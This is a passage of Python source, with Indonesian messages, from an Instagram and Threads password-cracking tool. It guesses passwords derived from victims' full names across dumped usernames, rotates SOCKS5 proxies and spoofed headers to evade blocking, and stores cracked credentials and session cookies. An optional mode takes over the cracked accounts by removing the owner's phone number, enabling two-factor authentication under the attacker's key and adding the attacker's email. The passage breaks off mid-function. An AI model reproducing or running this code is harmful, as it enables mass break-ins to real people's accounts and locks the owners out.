                try: tree = Tree(f'\r╭ logged in user',style='green'); true = tree.add(f""Succes logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='green'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); true = tree.add(f'\r╭ auth secure account',style='green'); true.add(f""status two {buka.split('|')[6]}""); true.add(f""secret key {buka.split('|')[7]}""); true.add(f""pemulihan {buka.split('|')[8]}""); true.add(f""telephone {buka.split('|')[9]}""); true.add(f""add email {buka.split('|')[10]}""); true.add(f""web email {buka.split('|')[11]}""); true = tree.add(f""Cookie {buka.split('|')[12]}""); tree.add(""Success cek in Result OK""); printz(tree)
                except Exception: tree = Tree(f'\r╭ logged in user',style='green'); true = tree.add(f""Succes logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='green'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); true = tree.add(f""Cookie {buka.split('|')[6]}""); tree.add(""Success cek in Result OK""); printz(tree)
                    
        elif result in ('2','02'):
            for buka in open(f'/sdcard/2F/'+str(isi)).readlines():
                try: tree = Tree(f'\r╭ logged in two factor',style='red'); true = tree.add(f""Gagal logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='red'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); tree.add(""Success cek in Result 2F""); printz(tree)
                except Exception: tree = Tree(f'\r╭ logged in two factor',style='red'); true = tree.add(f""Gagal logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); tree.add(""Success cek in Result 2F""); printz(tree)
                
        elif result in ('3','03'):
            for buka in open(f'/sdcard/CP/'+str(isi)).readlines():
                try: tree = Tree(f'\r╭ logged in checkpoint',style='yellow'); true = tree.add(f""Gagal logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='yellow'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); tree.add(""Success cek in Result CP""); printz(tree)
                except Exception: tree = Tree(f'\r╭ logged in checkpoint',style='yellow'); true = tree.add(f""Succes logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); tree.add(""Success cek in Result CP""); printz(tree)   
            
    def Methode(self):
        try:
            self.Meterans.append(Panel(f'[bold green]01.[bold white] Methode [bold green]Api V1\n[bold green]02.[bold white] Methode [bold green]Api Threads', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Url Api) [bold green]<[bold yellow]<[bold red]<',width = 32, style='bold grey50', subtitle = ""╭─────"", subtitle_align = ""left""))
            self.Meterans.append(Panel(f'[bold green]03.[bold white] Methode [bold green]Ajax V1\n[bold green]04.[bold white] Methode [bold green]Ajax Threads', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Url Ajax) [bold green]<[bold yellow]<[bold red]<',width = 32, style='bold grey50'))
            Console().print(Columns(self.Meterans))
            Methode_Login = Console().input(""[bold grey50]   ╰─> "")
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Apakah Anda Ingin Menggunakan Auto Amankan Data Akun OK (y/t)"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Secure Akun) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
            Secure_Akun = Console().input(""[bold grey50]   ╰─> "")
            if Secure_Akun =='y' or Secure_Akun =='ya':
                self.amankan_akun.append('ya')
            self.Exec_Methode(Methode_Login)
        except (Exception) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()                
        
    def Simpan_Result(self):
        self.waktu = datetime.datetime.now()
        self.bulan = ['Januari', 'Februari', 'Maret', 'April',  'Mei', 'Juni', 'Juli','Agustus', 'September', 'Oktober', 'November', 'Desember']
        return(f'OK-{self.waktu.day}-{self.bulan[self.waktu.month-1]}-{self.waktu.year}', f'2F-{self.waktu.day}-{self.bulan[self.waktu.month-1]}-{self.waktu.year}',f'CP-{self.waktu.day}-{self.bulan[self.waktu.month-1]}-{self.waktu.year}')
        
    def Password(self, fullname):
        self.one = []
        for nama in fullname.split(' '):
            nama = nama.lower()
            if len(nama) <3: continue
            elif len(nama) == 3 or len(nama) == 4 or len(nama) == 5: self.one.append(fullname.lower()); self.one.append(fullname.replace(' ','')); self.one.append(nama+'123'); self.one.append(nama+'1234'); self.one.append(nama+'12345')
            else: self.one.append(fullname.lower()); self.one.append(fullname.replace(' ','')); self.one.append(nama+'123'); self.one.append(nama+'1234'); self.one.append(nama+'12345')
        
    def Exec_Methode(self, Methode_Login):
        try:
            self.result_ok,self.result_two,self.result_cp = self.Simpan_Result()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[bold green]•[bold white] Result OK Tersimpan Di Folder : [bold green]/sdcard/OK/{self.result_ok}\n[bold red]•[bold white] Result 2F Tersimpan Di Folder : [bold red]/sdcard/2F/{self.result_two}\n[bold green]•[bold white] Result CP Tersimpan Di Folder : [bold yellow]/sdcard/CP/{self.result_cp}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Result Instagram) [bold green]<[bold yellow]<[bold red]<""))
            Console(width = 65).print(Panel('[bold white]Mainkan Mode Pesawat Setiap 200 Looping Agar Terhindar Spam!',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Warning Spam) [bold green]<[bold yellow]<[bold red]<',style='white'))
            with ThreadPoolExecutor(max_workers=30) as V:
                for Username_And_Fullname in dump:
                    username, fullname = Username_And_Fullname.split('<=>')
                    password = self.Password(fullname)
                    if Methode_Login in ('1'):
                        V.submit(self.ExecApi, username,password)
                    elif Methode_Login in ('2'):
                        V.submit(self.ExecApi_Threads, username,password)
                    elif Methode_Login in ('3'):
                        V.submit(self.ExecAjax, username,password)
                    elif Methode_Login in ('4'):
                        V.submit(self.ExecAjax_Threads, username,password)
                    else: V.submit(self.ExecApi, username,password)
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Selamat Kamu Telah Mendapatkan [bold green]{self.success}[bold white] Hasil OK, [bold yellow]{self.chekpoint}[bold white] Hasil Checkpoint Dan [bold red]{self.faktor}[bold white] Hasil Two Faktor, Dari {len(dump)} Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Selesai) [bold green]<[bold yellow]<[bold red]<""))
            exit()
        except (Exception) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()  
        
    def ExecApi(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                data = {'signed_body': '7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.{""id"":""{str(str(uuid.uuid4()))}"",""server_config_retrieval"":""1"",""experiments"": ""ig_android_account_switching,ig_android_upsell_fullname,ig_android_one_click_in_old_flow,ig_android_landing_page_fb_button,ig_fbns_push,ig_android_split_username_reg,ig_android_separate_avatar_upload,ig_android_contact_point_triage,ig_fbns_blocked,ig_android_re_enable_login_button,ig_android_phone_tab_on_left""}','ig_sig_key_version': '4'}
                curl = byps.get('https://i.instagram.com/api/v1/qe/sync/', data = data, allow_redirects=True)
                headers = {
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),
                    'x-ig-app-locale': 'in_ID',
                    'x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),
                    'x-ig-device-locale': 'in_ID',
                    'x-ig-mapped-locale': 'id_ID',
                    'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),
                    'x-bloks-version-id': '8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb',
                    'x-ig-timezone-offset': str(-time.timezone),
                    'x-ig-connection-type': 'MOBILE(LTE)',
                    'x-ig-capabilities': random.choice(['Fw==','3brTv10=','3brTvw8=','3brTvwM=']),
                    'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                    'x-ig-app-id': '567067343352427',
                    'priority': 'u=3',
                    'user-agent': Useragent().useragent_api(),
                    'accept-language': 'id-ID, en-US',
                    'x-bloks-is-layout-rtl': 'false',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Host': 'i.instagram.com',
                    'x-fb-http-engine': 'Liger',
                    'x-fb-client-ip': 'True',
                    'x-fb-server-cluster': 'True',
                    'x-fb-connection-type': 'MOBILE.LTE',
                    'connection': 'keep-alive',
                    'cookie': ("";"").join([ ""%s=%s"" % (key, value) for key, value in byps.cookies.get_dict().items() ])
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecApi(username, password)
        for passwd in password:
            try:
                hash = hashlib.md5()
                hash.update(username.encode('utf-8') + passwd.encode('utf-8'))
                hex_ = hash.hexdigest()
                hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))          
                payload = json.dumps({
                    'phone_id': str(uuid.uuid4()),
                    '_csrftoken': curl.cookies.get('csrftoken',None),
                    'username': username,
                    'guid': str(uuid.uuid4()),
                    'device_id': 'android-'+str(uuid.uuid4()),
                    'enc_password': Requre().enc_password(passwd),
                    'login_attempt_count': '0',
                    }
                )    
                encode = (f'signed_body=7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.'+urllib.parse.quote(payload)+'&ig_sig_key_version=4')
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://i.instagram.com/api/v1/accounts/login/', data = encode, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'logged_in_user' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)     
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecApi(username, password)
        self.looping+=1
        
    def ExecApi_Threads(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                data = {'signed_body': '7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.{""id"":""{str(str(uuid.uuid4()))}"",""server_config_retrieval"":""1"",""experiments"": ""ig_android_account_switching,ig_android_upsell_fullname,ig_android_one_click_in_old_flow,ig_android_landing_page_fb_button,ig_fbns_push,ig_android_split_username_reg,ig_android_separate_avatar_upload,ig_android_contact_point_triage,ig_fbns_blocked,ig_android_re_enable_login_button,ig_android_phone_tab_on_left""}','ig_sig_key_version': '4'}
                curl = byps.get('https://www.threads.net/api/v1/qe/sync/', data = data, allow_redirects=True)
                headers = {
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),
                    'x-ig-app-locale': 'in_ID',
                    'x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),
                    'x-ig-device-locale': 'in_ID',
                    'x-ig-mapped-locale': 'id_ID',
                    'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),
                    'x-bloks-version-id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73',
                    'x-ig-timezone-offset': str(-time.timezone),
                    'x-ig-connection-type': 'MOBILE(LTE)',
                    'x-ig-capabilities': random.choice(['Fw==','3brTv10=','3brTvw8=','3brTvwM=']),
                    'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                    'x-ig-app-id': '567067343352427',
                    'priority': 'u=3',
                    'user-agent': Useragent().useragent_api(),
                    'accept-language': 'id-ID, en-US',
                    'x-bloks-is-layout-rtl': 'false',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Host': 'www.instagram.com',
                    'x-fb-http-engine': 'Liger',
                    'x-fb-client-ip': 'True',
                    'x-fb-server-cluster': 'True',
                    'x-fb-connection-type': 'MOBILE.LTE',
                    'connection': 'keep-alive',
                    'cookie': ("";"").join([ ""%s=%s"" % (key, value) for key, value in byps.cookies.get_dict().items() ])
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecApi_Threads(username, password)
        for passwd in password:
            try:
                hash = hashlib.md5()
                hash.update(username.encode('utf-8') + passwd.encode('utf-8'))
                hex_ = hash.hexdigest()
                hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))          
                payload = json.dumps({
                    'phone_id': str(uuid.uuid4()),
                    '_csrftoken': curl.cookies.get('csrftoken',None),
                    'username': username,
                    'guid': str(uuid.uuid4()),
                    'device_id': 'android-'+str(uuid.uuid4()),
                    'enc_password': Requre().enc_password(passwd),
                    'login_attempt_count': '0',
                    }
                )    
                encode = (f'signed_body=7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.'+urllib.parse.quote(payload)+'&ig_sig_key_version=4')
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://www.threads.net/api/v1/accounts/login/', data = encode, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'logged_in_user' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break   
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)                  
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecApi_Threads(username, password)
        self.looping+=1
            
    def ExecAjax(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                curl = byps.get('https://www.instagram.com/accounts/onetap/?next=%2F&hl=en', allow_redirects=True)
                headers = {
                    'Host': 'www.instagram.com',
                    'content-length': str(random.randint(2000,2999)),
                    'x-ig-app-id': '1217981644879628',
                    'x-instagram-ajax': '1011794706',
                    'user-agent': Useragent().useragent_ajax(),
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'x-asbd-id': '129477',
                    'dpr': '2',
                    'x-csrftoken': curl.cookies.get('csrftoken',None),
                    'accept': '*/*',
                    'origin': 'https://www.instagram.com',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://www.instagram.com/?hl=en',
                    'accept-encoding': 'gzip, deflate',
                    'accept-language': 'en-US;q=0.8,en;q=0.9'
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecAjax(username, password)
        for passwd in password:
            try:          
                payload = {
                    'enc_password': Requre().enc_password(passwd),
                    'optIntoOneTap':'false',
                    'queryParams':json.dumps({""hl"":""en""}),
                    'trustedDeviceRecords':'{}',
                    'username': username,
                }
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', data = payload, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'userId' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
